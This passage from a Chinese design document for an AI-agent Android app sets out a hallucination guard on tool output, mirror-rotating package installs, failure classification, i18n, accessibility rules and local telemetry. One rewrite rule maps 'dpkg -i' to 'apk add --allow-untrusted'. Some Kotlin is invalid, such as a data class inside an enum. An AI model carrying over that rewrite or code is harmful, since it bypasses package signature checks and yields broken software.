    val fuses = fuseDao.getAll()
    fuses.forEach { fuse ->
        val real = rejectionDao.countByFuseScope(fuse.scope, fuse.sessionId)
        if (fuse.rejectionCount != real) {
            FileLogger.e(TAG,
                "DB 不一致：fuse=${fuse.id} rejection_count=${fuse.rejectionCount} 实际=$real"
            )
            fuseDao.updateRejectionCount(fuse.id, real)
            // 不写审计（计数不一致不直接影响用户，只留 ERROR 日志足够）
        }
    }
}
```

**DB-INV-1（新增不变性）**：任何一致性校验失败**永远不崩 App 不弹错误**，记 ERROR 级日志 + 尝试自动修数 + 必要时写 HardConstraintDeleteAudit 留痕。用户数据完整性 > ZTH 计数洁癖。

---

#### C.4.12 ✅ C.1.8 ToolOutputStore 流式 chunk 审查 → 方案 A：增量 chunk 预警+立刻中断+聚合终检+CP 不管临时文件

**C.4.12.1 ZthToolOutputGuard 两阶段审查（流式 Partial & Success 统一入口）**：

```kotlin
@Singleton
class ZthToolOutputGuard @Inject constructor(/* ... */) {
    private companion object {
        const val CHUNK_BATCH_SIZE = 10      // 每 10 个 chunk 扫 1 次
        const val CHUNK_BATCH_BYTES = 65536  // 或 64KB，哪个先到就先扫
    }

    // ── 阶段 1：流式增量审查（只启发式不调 LLM，命中风险 → 立即中断）─────
    /** 给 ToolStreamEvent.Progress(chunk) 调用（每收到一个 chunk 调一次）
     *  返回值：要不要继续执行工具
     *   - CONTINUE = 继续
     *   - ABORT_NOW = 立刻 cancel 工具（Process.destroy / 中断线程），输出截断 + 归 E2 幻觉
     */
    suspend fun onChunkArrived(streamCtx: StreamedToolContext, chunk: String): StreamVerdict {
        streamCtx.bufferChunks.add(chunk)
        streamCtx.bufferBytes += chunk.length

        val reachBatch = streamCtx.bufferChunks.size >= CHUNK_BATCH_SIZE
                     || streamCtx.bufferBytes >= CHUNK_BATCH_BYTES
        if (!reachBatch) return StreamVerdict.CONTINUE

        // 到了批次大小：跑启发式关键字扫描（20+ 条规则，不调 LLM，纯 Kotlin 正则）
        val joined = streamCtx.bufferChunks.joinToString("")
        val hits = HeuristicHallucDetector.detect(joined, toolName = streamCtx.toolName)

        streamCtx.bufferChunks.clear()
        streamCtx.bufferBytes = 0

        if (hits.isNotEmpty()) {
            // ✅ 命中 → 立刻 ABORT（中断工具执行，省时间/资源）
            //   把命中的行记录到 FailureEvidence，后续 FailureClassifier 归 E2_TOOL_OUTPUT_HALLUC
            streamCtx.intermediateHallucHits.addAll(hits)
            FileLogger.w("ZthToolOutput",
                "流式 chunk 审查命中 ${hits.size} 条幻觉信号，立即中断工具：${streamCtx.toolName}"
            )
            return StreamVerdict.ABORT_NOW(hallucHits = hits)
        }

        return StreamVerdict.CONTINUE
    }

    // ── 阶段 2：执行结束后聚合终检（LLM 完整审查）─────────────────────
    /** 工具返回 Completed(result) 时调用（Success / Partial 聚合后 / Error 统一走这里）
     *  命中 E2/E4 类信号 → 弹 ConfirmationCard 走正常 ZTH 流程 */
    suspend fun onToolCompleted(
        ctx: CapabilityGuardContext,
        toolName: String,
        result: ToolResult,
        streamedPartial: Boolean = false,   // true = 结果是 Partial 聚合来的（已跑阶段 1）
        intermediateHits: List<HallucSignal> = emptyList(),
    ): OutputVerdict {
        // （1）如果阶段 1 已经命中 halluc 信号 → 跳过 LLM，直接归 E2
        if (intermediateHits.isNotEmpty()) {
            return OutputVerdict.HALLUC_DETECTED_E2(evidence = intermediateHits)
        }
        // （2）否则：完整 LLM 审查聚合后的最终结果（和 Success 一样）
        return runLlmFullOutputAudit(ctx, toolName, result)  // ~500 tokens prompt
    }
}

enum class StreamVerdict { CONTINUE, data class ABORT_NOW(val hallucHits: List<HallucSignal>) }
enum class OutputVerdict { PASS, HALLUC_DETECTED_E2, HALLUC_DETECTED_E4, FAIL_FAST }
```

**C.4.12.2 HeuristicHallucDetector 20+ 条启发式规则（精确清单）**：

```kotlin
/* 纯 Kotlin 正则实现（chunk 阶段 1 扫描用，不调 LLM） */
object HeuristicHallucDetector {
    // 规则组 1：伪造文件路径（AI 编造不存在的路径当作返回结果）
    // 命中：输出大量形如 `/home/xxx/project/does-not-exist-123.py` 的路径，比真实 git ls 多 3 倍
    val FAKE_PATH_OVERRUN = Rule(
        pattern = """(?<=^|\s)/[A-Za-z0-9_\-/.~]{12,}(?=\s|$|:)""",
        minHitCount = 20,   // 20 条以上疑似路径才判
        filter = { matches -> matches.distinct().size > 15 }   // 且去重后 > 15
    )

    // 规则组 2：乱码 / base64 占比异常（AI 输出假数据造成长 base64）
    val BASE64_NOISE_RATIO = Rule(
        pattern = """[A-Za-z0-9+/=]{200,}""",
        minHitRatio = 0.30f,  // 总字符数中 base64 段占 ≥ 30%
    )

    // 规则组 3：命令 NOT_FOUND / No such file 重复（AI 执行了一堆假命令）
    val COMMAND_NOT_FOUND_LOOP = Rule(
        pattern = """(?:command not found|No such file or directory|not recognized as an internal)""",
        minHitCount = 5,
    )

    // 规则组 4：grep/ls 空文件结果异常多（AI 假造文件列表说存在其实没找到）
    val EMPTY_GREP_OVERRUN = Rule(
        pattern = """(?:grep: No such file|ls: cannot access|find: ‘[^’]+’: No such file)""",
        minHitCount = 8,
    )

    // 规则组 5：HTTP 404/403 循环（AI 伪造的 URL 访问）
    val HTTP_4XX_LOOP = Rule(
        pattern = """\b(404 Not Found|403 Forbidden|Failed to fetch)\b""",
        minHitCount = 6,
    )

    // 规则组 6：输出正文含"ERROR"重复超过 50 次（可能 AI 自己循环打日志）
    val ERROR_WORD_STORM = Rule(
        pattern = """\b(ERROR|Error|error|FAILURE|Failed|failed)\b""",
        minHitCount = 50,
    )

    // ... 剩余 14 条规则（真编码时补全 20 条）：
    //   - JSON 格式异常（{ 与 } 数量差 > 10）
    //   - 重复相同 60 字文本 > 20 次
    //   - git status 说有变更但 git diff 没内容 3 次
    //   - 文件行数报告（wc -l）和真实行数（cat | wc）差 > 100 行 2 次
    //   ...
}
```

**C.4.12.3 CheckpointManager 对 ToolOutputStore 临时文件的处理**：

```kotlin
/* CheckpointManager.beforeFileModified() 只快照 workspace 里的用户文件
 * ToolOutputStore 写的临时文件路径（= filesDir/tool_output_chunks/<sessionId>/<callId>/<n>.json）
 * → 不在 workspace 路径里 → CheckpointManager 本来就不会快照（现状不变）。
 *
 * L0/L1/L2 压缩上下文引用了这些 chunk 文件的 hash（做幂等还原比对）：
 *   - 正常 L0 还原时：hash 匹配 → 直接用；
 *   - hash 不匹配 / 文件不存在（被用户清缓存删了）：
 *       → 记 FileLogger.i("L0Restore：chunk $hash 不匹配/不存在，跳过不还原，重新执行工具")
 *       → 不阻塞还原流程，只把该工具标记为「需要重做」（StatefulAgentWorkflow 自动重跑）
 */
```

---

#### C.4.13 ✅ C.1.2 终端 Bundle 安装 → 方案 C：8 细分子类 + 自动 4 镜像切换重试 3 次（省用户操作）

**C.4.13.1 SubClass 从 4 类扩展到 8 类（精确枚举值）**：

```kotlin
// 现有 SubClass 枚举（ZTH_MODE_TECHNICAL_DESIGN_v1_0.md 定义的 16 个）里：
//   E11_INFRA 的 4 个 SubClass：
//     INFRA_TIMEOUT         // 审查超时（已有）
//     INFRA_NETWORK_DOWN    // 网络中断（已有，C.4.9 离线归这个）
//     INFRA_PROVIDER_OFFLINE // Provider 离线（已有）
//     INFRA_MIRROR_UNAVAILABLE // 镜像源不可用（C.4.9 原 4 类）
// 新增下面 4 个 SubClass → E11 合计 8 个 SubClass（扩展决策矩阵从 6×16 → 6×20）：
enum class SubClass {
    // ... 原有 16 个不变
    INFRA_PACKAGE_DNS_FAIL,        // DNS 解析失败（域名解析不了 dl-cdn.alpinelinux.org）
    INFRA_PACKAGE_TLS_HANDSHAKE,   // TLS 握手失败（中间人代理拦截 / 证书不对）
    INFRA_PACKAGE_PROXY_UNREACH,   // 配置了 HTTP_PROXY 但代理连不上 / 超时
    INFRA_PACKAGE_SIG_FAIL,        // APK 签名校验失败 / RSA 公钥不匹配
}
```

**C.4.13.2 FailureClassifier Throwable → 8 子类精确映射**：

```kotlin
// ZthFailureClassifier（E11 分支内新增 8 类 when 匹配）：
private fun classifyBundleInstallFailure(th: Throwable): SubClass = when {
    // 1. DNS 解析失败
    th is UnknownHostException
        || th.message?.contains(Regex("(hostname|name or service not known|DNS.*(?:fail|error|timeout))", RegexOption.IGNORE_CASE)) == true
    -> SubClass.INFRA_PACKAGE_DNS_FAIL

    // 2. TLS 握手失败（中间人代理 / 证书过期 / 加密套件不匹配）
    th is SSLHandshakeException || th is SSLPeerUnverifiedException
        || th.cause is CertificateException
        || th.message?.contains(Regex("(ssl|tls|certificate|handshake|cert path|verify)", RegexOption.IGNORE_CASE)) == true
    -> SubClass.INFRA_PACKAGE_TLS_HANDSHAKE

    // 3. 代理配置了但连不上（HTTP_PROXY / HTTPS_PROXY 环境变量存在时触发）
    (th is ConnectException || th is SocketTimeoutException)
        && System.getenv("HTTPS_PROXY")?.isNotBlank() == true
    -> SubClass.INFRA_PACKAGE_PROXY_UNREACH

    // 4. 网络超时 / 彻底连不上（C.4.9 原分类 → 保留）
    th is SocketTimeoutException || th is ConnectException
        || th.message?.contains(Regex("(connection (?:timed out|refused)|network is unreachable)")) == true
    -> SubClass.INFRA_NETWORK_DOWN

    // 5. 镜像 404 / 503（mirror 站点挂了 → 切镜像）
    th is FileNotFoundException || th is HttpResponseException
        || th.message?.contains(Regex("(HTTP 404|HTTP 503|404 Not Found|503 Service Unavailable)")) == true
    -> SubClass.INFRA_MIRROR_UNAVAILABLE

    // 6. 磁盘满
    th is IOException && th.message?.contains("No space left") == true
        || th.message?.contains(Regex("(ENOSPC|disk full|out of disk space)")) == true
    -> SubClass.INFRA_DISK_FULL  // （原有 C.4.9 提到 → 现在显式进 SubClass）

    // 7. SHA 校验失败 / 下载损坏
    th.message?.contains(Regex("(checksum|hash|sha(?:256|512|1)|integrity check|CORRUPTED PACKAGE)", RegexOption.IGNORE_CASE)) == true
    -> SubClass.INFRA_CORRUPT_DOWNLOAD  // （C.4.9 原 → 现在显式）

    // 8. APK / APT 签名校验失败 / GPG key 错
    th.message?.contains(Regex("(signature|BAD signature|key.*expired|GPG|public key not available|UNTRUSTED|signature verification failed)", RegexOption.IGNORE_CASE)) == true
        || th is SignatureException
    -> SubClass.INFRA_PACKAGE_SIG_FAIL

    else -> SubClass.INFRA_MIRROR_UNAVAILABLE  // 兜底归镜像不可用（切镜像通常能解决）
}
```

**C.4.13.3 Bundle 安装 4 镜像自动切换重试 3 次（核心流程，不经过用户）**：

```kotlin
/* 拍板方案 C：最省用户操作，全程自动 3 次切换镜像尝试，
 * 全失败才最终归 E11（整个链路过程不弹 ZTH Card，不打断用户）。
 * 只有 4 镜像全失败才把最终错误展示在 Card 「查看详情」里给用户 */

@Singleton
class TerminalBundleMirrorRotator(
    private val bundleRepository: TerminalBundleRepository,
) {
    // 4 个 Alpine 镜像（针对 Alpine，Ubuntu/Debian 用不同的镜像数组，下同）
    private val ALPINE_MIRRORS = arrayOf(
        "https://dl-cdn.alpinelinux.org/alpine/",        // 1. 官方
        "https://mirrors.aliyun.com/alpine/",            // 2. 阿里云
        "https://mirrors.tuna.tsinghua.edu.cn/alpine/",  // 3. 清华
        "https://mirrors.ustc.edu.cn/alpine/",           // 4. 中科大
    )
    private const val MAX_ATTEMPTS = 4  // 4 镜像各尝试 1 次 = 最多 4 次

    suspend fun installWithMirrorRotate(
        bundleId: TerminalBundleId,   // CORE / PYTHON / NODE / GIT ...
        onProgress: (phase: InstallPhase, slot: Int, logLine: String) -> Unit = {_,_,_->},
    ): TerminalBundleInstallResult {
        var lastError: Throwable? = null
        val attempts = mutableListOf<Pair<String, SubClass>>()

        for ((idx, mirror) in ALPINE_MIRRORS.withIndex()) {
            if (idx >= MAX_ATTEMPTS) break

            // 1. 切换 apk repositories 为当前镜像
            bundleRepository.setApkMirror(mirror)
            onProgress(InstallPhase.REPO_CONFIGURE, idx, "切镜像：${mirror.shortName()}")

            // 2. 执行 apk add / apt install
            val result = runCatching {
                withTimeout(90_000L) {  // 单个镜像 90 秒超时
                    bundleRepository.installSingleBundle(
                        bundleId,
                        mirrorBase = mirror,
                        onProgress = onProgress
                    )
                }
            }

            when (result) {
                is Result.Success -> {
                    onProgress(InstallPhase.COMPLETED, idx, "✓ ${mirror.shortName()} 安装成功")
                    return TerminalBundleInstallResult.Ok(mirror, idx + 1)
                }
                is Result.Failure -> {
                    val subclass = classifyBundleInstallFailure(result.exception)
                    attempts += mirror to subclass
                    lastError = result.exception
                    onProgress(InstallPhase.FAILED, idx,
                        "✗ ${mirror.shortName()} 失败(${subclass.name})，尝试下一个镜像..."
                    )
                    // 3. 2 秒间隔（不要打镜像 429）
                    delay(2000L)
                }
            }
        }

        // 4 镜像全失败 → 返回 Aggregate（包含所有 4 次的错误 + 子类）
        return TerminalBundleInstallResult.AllMirrorsFailed(
            attemptTrace = attempts,
            lastError = lastError!!
        )
    }
}
```

**C.4.13.4 Bundle 安装 4 次全失败的 ZTH UI 展示**：

```kotlin
// 用户点「查看工具执行详情」时：
//   顶部 3 个行动按钮（方案 C 不提供手动重试，因为已经自动重试 3 次 × 4 镜像 = 12 次了 → 手动重试大概率也不行）
@Composable
fun BundleInstallFailActions(
    result: TerminalBundleInstallResult.AllMirrorsFailed,
    onCommand: (BundleInstallAction) -> Unit,
) {
    // 用户能做的 3 件事（省按钮位，不显示 3 个单按钮 → 用下拉选择 + 1 个执行按钮）
    ExposedDropdownMenuBox(...) {
        DropdownMenuItem(text = { Text("检查网络后再试一次（再跑 4 镜像）") }, onClick = { onCommand(RETRY_ALL_4) })
        DropdownMenuItem(text = { Text("临时改国内 HTTP(S) 代理后重试") }, onClick = { onCommand(SET_PROXY_AND_RETRY) })
        DropdownMenuItem(text = { Text("跳过本次 Bundle，不用该工具（继续生成回复）") }, onClick = { onCommand(SKIP_BUNDLE_THIS_REPLY) })
    }
    // 下方展示 4 镜像 × 4 子类错误 trace（红色小字，好定位）：
    // [1/4] 官方 → INFRA_PACKAGE_TLS_HANDSHAKE
    // [2/4] 阿里云 → INFRA_PACKAGE_DNS_FAIL
    // [3/4] 清华 → INFRA_NETWORK_DOWN
    // [4/4] 中科大 → INFRA_DISK_FULL
}
```

---

#### C.4.14 ✅ C.1.9 容器设置包管理器不匹配 → 方案 A：直接 E11 + 卡片顶部提示 CommandTransform

**C.4.14.1 FailureClassifier 包管理器不匹配直接命中 E11（不归 E5）**：

```kotlin
// FailureClassifier 在 E5/E11 判定前加一个前置判定（优先级最高，先于 Throwable 根因分析）：
private fun detectPackageManagerMismatch(
    command: String,       // execute_command 的完整命令前缀（不含参数）
    activeProfile: ContainerProfile,
): SubClass? {
    val apkMismatch = command.startsWith("apk")
        && activeProfile.rootfsDistroId in setOf("debian", "ubuntu", "kali", "mint") // Debian 系（无 apk）
    val aptMismatch = command.startsWithAny("apt", "apt-get", "dpkg")
        && activeProfile.rootfsDistroId in setOf("alpine", "busybox")                 // Alpine 系（无 apt）
    val pacmanMismatch = command.startsWith("pacman")
        && activeProfile.rootfsDistroId !in setOf("arch", "manjaro", "endeavouros")    // Arch 系（pacman 独有）
    val yumMismatch = command.startsWithAny("yum", "dnf", "rpm")
        && activeProfile.rootfsDistroId !in setOf("centos", "fedora", "rhel", "rocky", "alma") // RHEL 系

    return when {
        apkMismatch || aptMismatch || pacmanMismatch || yumMismatch ->
            SubClass.INFRA_PACKAGE_MANAGER_MISMATCH  // ✅ 新 SubClass（E11）
        else -> null
    }
}
// 如果命中：FailureClass 强制 E11（不进 E5_TOOL，因为不是 AI 幻觉 = 是 profile 切换后的环境问题）
```

**C.4.14.2 ZTH Card 顶部提示 & CommandTransform 自动改写**：

```kotlin
/* ZthConfirmationCard 在收到 INFRA_PACKAGE_MANAGER_MISMATCH 时，
 * CardHeader 多显示一行蓝色 TIP（用户不滑动确认也能看到）：
 *   ┌──────────────────────────────────────────────────────────┐
 *   │ ⚠️ 当前容器是 Ubuntu 22.04 镜像，apk 命令不可用              │
 *   │ 💡 建议开启自动改写：本次会话后续所有 apk add → apt install │
 *   │    apk search → apt search，等包管理器等价命令自动改写      │
 *   └──────────────────────────────────────────────────────────┘
 */

// 用户滑动（SwipeToConfirm）「确认」按钮时：把用户是否勾了「开启自动改写」存进 session scope 配置
// → StatefulAgentWorkflow 给所有 execute_command 套一层 CommandTransform：
@Singleton
class PkgManagerCommandTransformer(
    private val sessionConfig: ZthPerSessionConfig,  // 当前会话的用户勾选
) {
    // 仅当用户勾了「开启自动改写」才生效（会话结束自动失效，下次会话重新询问）
    fun transform(command: String, activeProfile: ContainerProfile): String {
        if (!sessionConfig.autoRewritePackageManager) return command

        return when (activeProfile.rootfsDistroId) {
            // Alpine → 所有 apt 系列 → apk 等价
            in setOf("alpine", "busybox") -> {
                command
                    .replace(Regex("""^apt(-get)? install """), "apk add ")
                    .replace(Regex("""^apt(-get)? search """), "apk search ")
                    .replace(Regex("""^apt(-get)? remove """), "apk del ")
                    .replace(Regex("""^apt(-get)? update """), "apk update")
                    .replace(Regex("""^dpkg -i """), "apk add --allow-untrusted ")
            }
            // Debian/Ubuntu → 所有 apk 系列 → apt 等价
            in setOf("debian", "ubuntu", "kali", "mint", "pop") -> {
                command
                    .replace(Regex("""^apk add """), "apt install -y ")
                    .replace(Regex("""^apk search """), "apt search ")
                    .replace(Regex("""^apk del """), "apt remove -y ")
                    .replace(Regex("""^apk update """), "apt update")
            }
            // RHEL / Fedora（yum 互转）
            in setOf("centos", "fedora", "rhel", "rocky", "alma") -> {
                command
                    .replace(Regex("""^apk add """), "yum install -y ")
                    .replace(Regex("""^apt install """), "yum install -y ")
            }
            // 其他 distro：不做改写
            else -> command
        }
    }
}
// 不变性 TRANSFORM-INV-1：改写仅在**同一次会话内**有效，会话结束 sessionConfig 自动销毁
// → 下次用户新开一个会话切回 Alpine，不会因为上次改写把 apt 转成 apk 导致误用。
```

---

#### C.4.15 ✅ C.2.9 i18n & A11y → 方案 A：zh/en 双语 + 全量 WCAG A11y

**C.4.15.1 i18n 字符串分类清单（精确分组，共 134 条）**：

```
所有 @StringRes 按功能进 strings.xml <string name="...">，默认 zh-rCN，同时提供 values-en/strings.xml：

├─ 1. SwipeToConfirm（6 条）
│    zth_swipe_hint_default        向右滑动以确认（默认）
│    zth_swipe_hint_high_risk      向右滑动以确认高风险操作（E1/E8 红色滑块）
│    zth_swipe_hint_plan           向右滑动以批准此执行计划
│    zth_swipe_desc_a11y           "滑动确认按钮，向右滑到底以执行"
│    zth_swipe_progress_a11y       "滑块进度 %1$d%%"
│    zth_swipe_completed_a11y      "已确认，正在执行..."

├─ 2. ZthConfirmationCard（20 条）—— 16 SubClass 模板 + 4 通用按钮
│    zth_card_title_e1_provider_unreachable       "⚠️ 模型调用 3 次均失败，请确认网络或切换模型"
│    zth_card_title_e2_tool_output_halluc         "⚠️ 工具输出疑似有幻觉（伪造文件路径等）"
│    ... 其余 14 个 SubClass 标题
│    zth_card_btn_view_details     "查看详情（%1$d 项）"
│    zth_card_btn_reject           "拒绝（不执行）"
│    zth_card_btn_retry            "重试当前操作"
│    zth_card_btn_user_fix         "我来手动处理"

├─ 3. 4 种 Fuse 横幅（8 条）
│    zth_fuse_open_session_banner  "🔒 当前会话已触发零幻觉保护，暂停生成，请检查"
│    zth_fuse_open_session_a11y    "警告：已触发会话级熔断保护，当前会话已暂停生成回复"
│    zth_fuse_half_session_banner  "⏳ 此会话 %1$d 秒内仅允许 1 次试放行"
│    zth_fuse_half_session_a11y    "当前会话处于熔断冷却，剩余 %1$d 秒内仅允许 1 次试放行"
│    zth_fuse_open_global_banner   "🚫 全局已触发零幻觉保护，所有会话暂停生成"
│    zth_fuse_open_global_a11y     "警告：已触发全局熔断保护，所有会话均已暂停"
│    zth_fuse_half_global_banner   "⏳ 全局 %1$d 秒内仅允许 1 次试放行（跨所有会话）"
│    zth_fuse_half_global_a11y     "全局熔断冷却中，剩余 %1$d 秒，所有会话共允许 1 次试放行"

├─ 4. 离线横幅（2 条）
│    zth_offline_banner            "当前离线，ZTH 审查降级为手动模式（只读/白名单自动放行）"
│    zth_offline_banner_a11y       "当前处于离线状态，零幻觉审查已降级为手动确认模式"

├─ 5. ZTH 设置页（24 条）
│    zth_setting_title             "🔒 ZTH 零幻觉容忍模式"
│    zth_setting_desc              "对幻觉几乎零容忍，出现疑似幻觉时向您发起确认卡片"
│    zth_preset_0_title            "档位 0：关闭"
│    zth_preset_0_desc             "完全关闭零幻觉审查（与旧版本行为一致）"
│    zth_preset_1_title            "档位 1：平衡（推荐）"
│    ... 档位 2 严格 / 档位 3 零容忍 8 条描述
│    zth_remote_ssh_unsupported    "🔒 ZTH 模式暂不支持远程 SSH，请切回本地模式后开启"
│    zth_low_end_device_unsupported "⚠️ 设备性能不足（RAM ≤ 4GB 或 Android ≤ 9），ZTH 模式暂不支持"
│    ... 其余 10 条设置描述

├─ 6. ChainOverviewCard（14 条）
│    zth_chain_title               "零幻觉审查链路"
│    zth_chain_l0_name             "L0 软压缩"
│    zth_chain_l1_name             "L1 选择性压缩"
│    zth_chain_l2_name             "L2 全量保真压缩"
│    zth_chain_elapsed             "已执行 %1$.1f / %2$d 秒（阈值）"
│    zth_chain_reduction           "上下文减少 %1$d%% tokens"
│    ... 7 条 CapabilityGuard/PlanApproval/Classification 状态显示

├─ 7. 备份还原提示（6 条）
│    zth_backup_keystore_missing   "🔒 此确认卡跨设备还原后内容密钥不可用"
│    zth_backup_btn_skip           "跳过此确认（标为已拒绝）"
│    zth_backup_btn_regen          "重新发起请求（重新生成）"
│    ... 3 条 DB 不一致日志展示

├─ 8. Skill 正文风险警告 & 工具输出截断（10 条）
│    zth_skill_risk_title          "⚠️ 技能「%1$s」的指令正文检测到潜在风险"
│    zth_skill_risk_matches        "命中 %1$d 条危险指令模式：%2$s"
│    zth_output_truncated          "工具输出因幻觉信号命中已截断（%1$d 条信号）"
│    ... 7 条流式 chunk 命中时提示

├─ 9. Container Profile 切换提示 & Bundle 安装 4 镜像失败（20 条）
│    zth_pkg_mismatch_tip          "💡 建议开启自动改写：本次会话后续所有 %1$s → %2$s"
│    zth_bundle_attempt_trace_line "[%1$d/%2$d] %3$s → %4$s"
│    ... 18 条 8 子类错误描述（DNS / TLS / 代理 / 磁盘满 / 签名等）

└─ 10. DevMenu / 调试（24 条）—— C.2.11 拍板后细化，此处占位翻译 id
```

**C.4.15.2 A11y 10 条强制不变性（WCAG 合规 = 编码 checkList）**：

```kotlin
// A11Y-INV-1（尺寸）：所有交互控件（Swipe 滑块/拒绝按钮/查看详情按钮/下拉菜单选项）
//   → min size = 48.dp（Material WCAG 最小点击），不允许有 40dp 的控件
// A11Y-INV-2（语义）：所有控件有 contentDescription = @StringRes（不写硬编码英文）
// A11Y-INV-3（状态）：
//   SwipeToConfirm → Semantics.stateDescription = "滑块进度 ${floor(progress*100)}%"
//   ChainOverviewCard 3 层进度 → Semantics { progress(...) + stateDescription(层级名称) }
//   Fuse HALF_OPEN 横幅 → stateDescription = "熔断冷却剩余 %d 秒"
// A11Y-INV-4（颜色语义 2 重）：
//   Fuse OPEN 横幅 → 不能只靠颜色区分 → 同时带 ⚠ Icon + 加粗 "已触发零幻觉保护" 文字
//   用户色盲模式（色盲测试卡）：红/黄/蓝 → 配 3 种不同形状图标（⚠ FuseOpen / ⏳ FuseHalf / 📡 Offline）
// A11Y-INV-5（字体缩放 200%）：所有 Text 都不用 Modifier.height(x) 写死高度
//   → 固定高度用 Card + LazyColumn（内容超过时可滚动，不截断）
// A11Y-INV-6（滑动键盘触发）：SwipeToConfirm 支持 Tab 聚焦 + 空格按下触发「确认」
//   → 外接键盘无障碍用户（TalkBack 键盘模式）能操作（后续扩展，先支持接口）
// A11Y-INV-7（焦点顺序）：Card 的 Tab 顺序：查看详情 → 拒绝（左）→ SwipeToConfirm（右）
//   → 禁止 SwipeToConfirm 先获得焦点（防用户连按 Tab 后误操作）
// A11Y-INV-8（操作可逆）：所有 SwipeToConfirm 触发后的滑动动画 = 300ms 缓慢回位
//   → 用户滑到 95% 松手不触发（需要 98% 以上），给反悔空间
// A11Y-INV-9（震动反馈）：SwipeToConfirm 触发确认时，执行 HapticFeedbackConfirm
//   → 振动 20ms（无障碍用户触感反馈），系统设置里关了震动就不震
// A11Y-INV-10（动态字号）：所有文案用 sp 不用 dp，遵循系统字体缩放设置
```

---

#### C.4.16 ✅ C.2.10 埋点遥测 → 方案 B：14 类指标 + App 内自绘 Canvas 4 图表查看，不导出

**C.4.16.1 ZthTelemetryStore（Room 新表，14 类指标 100% 本地存储，零网络上传）**：

```kotlin
/* 注意：用户选方案 B，和方案 A 的 5 类 NDJSON 导出不一样！
 * B = 结构化 14 指标 → Room 表存下来 → 设置页自绘 4 张 Canvas 图表给用户看
 * 不接任何第三方 SDK，不导出 zip（防用户误分享） */

// 1. 新增 Entity（独立 Room 表，v37 schema 同步加入，已有 5 ZTH 表外新增第 6 张 zth_telemetry_event）
@Entity(tableName = "zth_telemetry_event")
data class ZthTelemetryEventEntity(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val ts: Long,              // 时间戳（毫秒）
    val dayBucket: Int,        // yyyymmdd 整型，用于分天聚合（20250810）
    val eventType: String,     // "CARD_SHOW" / "CARD_ACTION" / "FUSE_TRANS" / "COMPACT_TRIG" / "FAIL_CLASS"  5 大类
    @ColumnInfo(defaultValue = "") val dim1: String = "",  // 维度 1：cardType / action / fromState / level / failureClass
    @ColumnInfo(defaultValue = "") val dim2: String = "",  // 维度 2：preset_level / latency_bucket / toState / success / subclass
    @ColumnInfo(defaultValue = "0") val valLong: Long = 0L, // 数值：latency_ms / tokens_before / tokens_after / resolved_by_user
)

// 2. DAO：只做 SELECT GROUP BY（聚合给 Canvas 画图，不做单条查）
@Dao interface ZthTelemetryDao {
    /** 过去 N 天，cardType × preset_level 计数（饼图 1） */
    @Query("SELECT dim1, dim2, COUNT(*) FROM zth_telemetry_event WHERE eventType='CARD_SHOW' AND dayBucket>=:minBucket GROUP BY dim1, dim2")
    suspend fun aggCardShowPie(minBucket: Int): List<PieSlice>
    /** 用户操作延迟分布 P50/P95/P99（直方图 1） */
    @Query("SELECT valLong FROM zth_telemetry_event WHERE eventType='CARD_ACTION' AND dim1='CONFIRMED' AND dayBucket>=:minBucket ORDER BY valLong")
    suspend fun rawConfirmLatencies(minBucket: Int): List<Long>
    /** Fuse 跃迁原因 × from→to state 计数（热力图 1） */
    @Query("SELECT dim1, dim2, COUNT(*) FROM zth_telemetry_event WHERE eventType='FUSE_TRANS' AND dayBucket>=:minBucket GROUP BY dim1, dim2")
    suspend fun aggFuseTransitionHeatmap(minBucket: Int): List<HeatCell>
    /** L0/L1/L2 压缩率 P25/P50/P75（箱线图 1）：valLong_before/after 存 2 条事件，用关联 ID 合并 */
    @Query("""SELECT t1.valLong beforeT, t2.valLong afterT FROM zth_telemetry_event t1
         INNER JOIN zth_telemetry_event t2 ON t1.id+1=t2.id
         WHERE t1.eventType='COMPACT_TRIG' AND t1.dim2='TOKENS_BEFORE'
         AND   t2.eventType='COMPACT_TRIG' AND t2.dim2='TOKENS_AFTER'
         AND t1.dayBucket>=:minBucket""")
    suspend fun aggCompressionRatioBox(minBucket: Int): List<RatioPoint>
    /** 16 SubClass（现在扩展到 20 了）分布 × 是否用户解决（柱状图 2） */
    @Query("SELECT dim1 subclass, SUM(valLong) userSolved, COUNT(*) total FROM zth_telemetry_event WHERE eventType='FAIL_CLASS' AND dayBucket>=:minBucket GROUP BY dim1")
    suspend fun aggSubClassBar(minBucket: Int): List<BarRow>
}
```

**C.4.16.2 设置页 ZthTelemetryDashboard Composable（4 张 Canvas 自绘图表，不导出）**：

```kotlin
@Composable fun ZthTelemetryDashboard() {
    // 用户点击设置页 → ZTH 档位区块底部的「📊 查看 7 天 ZTH 运行数据」卡片
    // → 跳转新屏幕（ZthTelemetryScreen），分 4 个区块顺序排列：
    Column(Modifier.verticalScroll(rememberScrollState())) {
        SectionHeader("① 弹卡类型 × 档位分布（过去 7 天饼图）")
        CanvasPie(aggCardShowPie(7))        // 400×400 Canvas.drawArc 自绘

        SectionHeader("② 用户「确认」操作耗时 P50/P95/P99 直方图（ms）")
        CanvasHistogram(rawConfirmLatencies(7)) // 520×280，每 500ms 一个柱，P50/P95/P99 竖虚线标数字

        SectionHeader("③ Fuse 状态跃迁原因 × 次态热力图")
        CanvasHeatmap(aggFuseTransitionHeatmap(14))  // 过去 14 天 6×6 格（6 态 × 6 态）

        SectionHeader("④ L0/L1/L2 压缩率分布（箱线图）+ 20 SubClass 分布柱")
        CanvasBoxplot(aggCompressionRatioBox(14))    // 压缩率箱线：0% 到 100%
        Spacer(20.dp)
        CanvasBarchart(aggSubClassBar(28))           // 过去 28 天：20 柱子类，深蓝=总计，浅蓝=用户解决
    }
}
// 不变性 BURIED-INV-1（埋点 C 方案拍板的核心约束）：
//   ZthTelemetryScreen 绝对不显示任何用户数据明文：
//   不显示 sentinel_content hash、不显示 cardId、不显示会话标题、不显示 git commit message、不显示模型名。
//   所有维度聚合时只保留：类型、档位、状态、延迟、数量。
```

---

#### C.4.17 ✅ C.2.11 ZTH DevMenu → 方案 A：7 连点 + 14 项 + BuildConfig 危险项隐藏

**C.4.17.1 入口：设置页 7 连点注册**：

```kotlin
// 在 SettingsScreen.kt → ZthPresetSelector 卡片标题 Text 上注册：
var consecutiveClicks by remember { mutableIntStateOf(0) }
val clickResetJob = remember { mutableStateOf<Job?>(null) }

Text(
    text = stringResource(R.string.zth_setting_title),  // "🔒 ZTH 零幻觉容忍模式"
    modifier = Modifier.clickable(indication = null, interactionSource = remember { MutableInteractionSource() }) {
        // 7 连点：每次点击 1.5 秒内必须继续，否则重置为 0
        clickResetJob.value?.cancel()
